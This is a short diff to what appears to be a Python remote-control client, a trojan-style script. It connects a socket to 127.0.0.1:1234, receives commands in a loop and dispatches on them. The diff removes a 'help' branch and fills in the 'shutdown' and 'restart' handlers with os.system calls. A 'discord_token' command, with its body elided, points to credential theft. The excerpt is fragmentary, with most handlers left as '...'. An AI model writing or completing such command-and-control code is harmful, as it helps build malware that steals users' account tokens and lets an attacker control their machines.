@@ -8,18 +8,15 @@ s.connect(('127.0.0.1', 1234))
 
 while True:
     cmd = s.recv(1024).decode()
-    
-    if cmd == 'help':
-        pass
-    
-    elif cmd == 'discord_token':
+
+    if cmd == 'discord_token':
         ...
     
     elif cmd == 'shutdown':
-        ...
+        os.system('shutdown /s')
     
     elif cmd == 'restart':
-        ...
+        os.system('shutdown /r')
     
     elif cmd == 'sleep':
         ...
